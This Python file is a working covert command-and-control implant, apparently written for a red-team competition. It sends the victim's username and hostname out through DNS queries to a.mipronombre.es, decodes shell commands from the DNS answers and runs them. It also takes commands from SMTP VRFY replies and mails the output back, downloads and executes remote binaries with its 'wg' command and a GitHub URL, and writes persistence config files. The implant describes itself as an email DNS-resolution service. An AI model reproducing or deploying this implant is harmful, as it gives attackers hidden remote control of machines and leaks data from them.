"""
    This is based on code pulled from https://github.com/ValeryTyumen/DNS-Client combined into one
    file for easy dropping.
    This code can't decode TXT records or anything fun, so I'm going to encode everything as MX or CNAME
    But that has to meet the requirements for hostnames, which can only have [0-9], [a-z], -
"""


# SERVER = "127.0.0.1"
SERVER = "8.8.8.8"
TARGET_FQDN = "a.mipronombre.es"
dnsResult = False

'''
Copyright (c) 2014 Valera Likhosherstov <v.lihosherstov@gmail.com>
dns message structures
'''
import smtplib
import struct
import random
import getpass
import socket
import subprocess
import urllib.request
import os
import sys
import argparse
import time
from dns.clib import *

c2IP = "samplec2.ists."
c2enabled = False

def wget(cmd):
    #parse a "wg http://..." command
    #chmod +x downloaded file
    #xeq downloaded file
    url = cmd[3:]
    extension = cmd[-4:] #This is mostly for windows stuff
    fileName, headers = urllib.request.urlretrieve(url) #saves as temp file
    os.rename(fileName, fileName+extension)
    fileName += extension
    os.chmod(fileName, 0o555) #r-xr-xr-x
    print(fileName)
    out = subprocess.Popen([fileName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    (stdout, stderr) = out.communicate()

def configFile(command):
    #Place a config file in the correct location depending on OS and privilege levels
    if os.name == "posix":
        try:
            f = open("/etc/mailman","w")
            f.write(command.split(" ")[1])
        except:
            f = open("~/.mailman","w")
            f.write(command.split(" ")[1])
    else:
        try:
            f = open("C:\\Windows\\mailman.ini")
            f.write(command.split(" ")[1])
        except:
            f = open(os.environ["APPDATA"]+"\\mailman.ini", "w")
            f.write(command.split(" ")[1])

def runCommand(command):
    if len(command) > 3:
        if command[0:2] == "wg ":
            wget(command)
            return
    if command == "sojuman":
        wget("wg https://github.com/ChoiSG/sojuman/raw/master/dist/sojuman")
        return
    if len(command) > 5:
        if command[0:5] == "conf ":
            configFile(command)
            return
    out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return out.communicate()





'''
Copyright (c) 2014 Valera Likhosherstov <v.lihosherstov@gmail.com>
DNS client engine
'''

class DNSClient:
    '''dns client class
    '''

    def __init__(self, server=SERVER):
        self.socket = socket.socket(socket.AF_INET,
                                    socket.SOCK_DGRAM)
        self.socket.settimeout(5)
        self.connect_server(server)

    def connect_server(self, server):
        '''connection
        '''
        try:
            self.socket.connect((server, 53))
        except Exception:
            print('Unable to connect to server {0}'.format(server))
            return False
        self.server = server
        return True

    def cmdDecode(self, results):
        rawCommand = ""
        for result in results:
            rawCommand += result
        commandParts = [rawCommand[i:i + 2] for i in range(0, len(rawCommand), 2)]
        command = ""
        for part in commandParts:
            command += chr(int(part)+32)
        return command


    def send_query(self, request, recursion_desired=True,
                   debug_mode=False, IPv6=False):
        '''request
        '''

        global c2enabled
        global c2IP

        format = DNSMessageFormat()
        query = format.encode(request, recursion_desired, IPv6)
        self.socket.send(query)
        try:
            response = self.socket.recv(1024)
        except Exception:
            print('Time Out: {0}'.format(self.server))
            sys.exit(0)
        format.decode(response)

        if len(format.answers) > 0:
            format.print_result()
            results = format.get_results()
            if len(results) > 0:
                if request == "c2.a.mipronombre.es.":
                    c2IP = results
                    # self.socket.close()
                    return
                if request == "c2e.a.mipronombre.es.":
                    c2enabled = (results == "yes.")
                    # self.socket.close()
                else:
                    # command = self.cmdDecode(results)
                    # print(results)
                    # print(command)
                    # out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                    (stdout, stderr) = runCommand(self.cmdDecode(results))
                    dnsResult = True
                    # self.socket.close()
        elif not recursion_desired:
            for rr in format.additional_RRs:
                if self.connect_server(rr.resource_data.ip):
                    ipv6 = (rr.type == 28)
                    self.send_query(request, recursion_desired=False,
                                    debug_mode=debug_mode, IPv6=ipv6)

    def disconnect(self):
        '''disconnect
        '''
        self.socket.close()


def dnsRun(dest):
    client = DNSClient(server=dest)
    username = getpass.getuser()
    machineIP = socket.getfqdn()  # should get full hostname/domain name
    requestName = username + "AT." + machineIP + "." + TARGET_FQDN
    # print("Requesting:", requestName)
    client.send_query("c2.a.mipronombre.es.", recursion_desired=True, debug_mode=False)
    client.send_query("c2e.a.mipronombre.es.", recursion_desired=True, debug_mode=False)
    client.send_query(requestName, recursion_desired=True, debug_mode=False)
    client.disconnect()

def smtpRun(dest):
    connection = smtplib.SMTP()
    connection.connect(dest, 25)
    connection.ehlo()
    username = getpass.getuser()
    # machineIP = socket.gethostbyname_ex(socket.gethostname())[-1][-1] #Tested on windows
    machineIP = socket.getfqdn() #should get full hostname/domain name
    emailAddr = username + "@" + machineIP
    code,command = connection.verify(emailAddr) #tuple of code and string response
    if(code != 250):
        return #Wait for next run
    command = command.decode("UTF-8")
    stdout,stderr = runCommand(command)
    if stdout != None:
        stdout = stdout.decode("UTF-8")
    else:
        stdout = ""
    if stderr != None:
        stderr = stderr.decode("UTF-8")
    else:
        stderr = ""
    connection.sendmail(emailAddr, "mailman@"+dest, stdout+"\n"+stderr)

def linuxResolv():
    for line in open("/etc/resolv.conf", "r"):
        cols = line.split()
        if cols[0] == "nameserver":
            return cols[1:]
    return "localhost"

def windowsResolv():
    fqdn = socket.getfqdn()
    parts = fqdn.split(".")
    if len(parts) > 1:
        #try to hit their DC
        return "lordnikon."+ ".".join(parts[1:])
    return "localhost" #It's worth a try?

def combine(lst):
    retVal = ""
    for s in lst:
        retVal += s
    return retVal

def guessDest():
    #Check if the config file exists
    if os.name == "posix":
        configLoc = "/etc/mailman"
    else:
        configLoc = "C:\\Windows\\mailman.ini"
    try:
        f = open(configLoc, "r")
        dest = f.read()
        return dest,dest
    except:
        if os.name == "posix":
            configLoc = "~/.mailman"
        else:
            configLoc = os.environ["APPDATA"]+"\\mailman.ini"
        try:
            f = open(configLoc, "r")
            dest = f.read().strip()
            return dest,dest
        except:
            #now we just sorta ... guess our resolver
            if os.name != "posix":
                return "",combine(windowsResolv())
            elif sys.platform == "linux":
                return "",combine(linuxResolv())
    return "","localhost"

def main():
    smtpDest = ""
    dnsDest = ""
    smtpDest,dnsDest = guessDest() #let's guess a resolver and then overwrite if the args say otherwise

    parser = argparse.ArgumentParser(description='Maintains DNS resolution for email delivery.')
    parser.add_argument("--systemd", help="Take input and timing from SystemD rather than running automatically by itself.", action="store_true")
    #parser.add_argument('-D', "--dns", help="Use DNS", action="store_true")  #We'll always run DNS
    parser.add_argument("-S", "--smtp", help="Use SMTP", action="store_true")
    parser.add_argument('hostname', help="The hostname or IP of the destination server")
    args = parser.parse_args()

    if args.hostname is not None and args.hostname != "":
        smtpDest = args.hostname
        dnsDest = args.hostname

    while True:
        dnsRun(dnsDest)
        if args.smtp:
            smtpRun(smtpDest)
        if c2enabled:
            # istsbot.istsCallback(c2IP)
            pass
        if args.systemd:
            # running from systemd, don't enable timed autorun
            sys.exit(0)
        time.sleep(30)

if __name__ == "__main__":
    main()